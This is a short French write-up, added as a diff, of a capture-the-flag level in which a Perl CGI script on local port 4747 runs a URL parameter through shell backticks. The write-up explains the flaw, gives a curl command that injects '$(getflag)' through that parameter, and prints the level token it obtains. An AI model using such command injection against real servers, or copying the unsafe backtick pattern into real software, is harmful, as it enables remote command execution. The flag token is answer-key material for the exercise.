@@ -1,0 +1,25 @@
+Lorsqu'on se connecte en tant qu'utilisateur level04 on obtient un fichier nommé level04.pl qui est un script perl.
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+On voit que ce script tourne sur le port 4747 de notre localhost.
+
+Il importe 'param' depuis le CGI (Common Gateway Interface) qui est un protocole d'exécution de scripts via des requêtes Web.
+
+Il envoie ensuite le header http permettant au serveur et au browser d'interpréter correctement le reste du text.
+
+Et enfin il fait une fonction x qui prend le premier paramètre $_[0] et l'enregistre dans la variable $y. Ce programme utilise ce qu'on lui envoi en tant que paramètre dans l'url est nous renvoie le résultat.
+
+On peut donc l'exploiter en envoyant à la variable $y une commande shell comme ceci :
+
+curl 127.0.0.1:4747?x='$(getflag)'
+
+Ce qui nous donne le token pour le niveau suivant : ne2searoevaevoem4ov4ar8ap
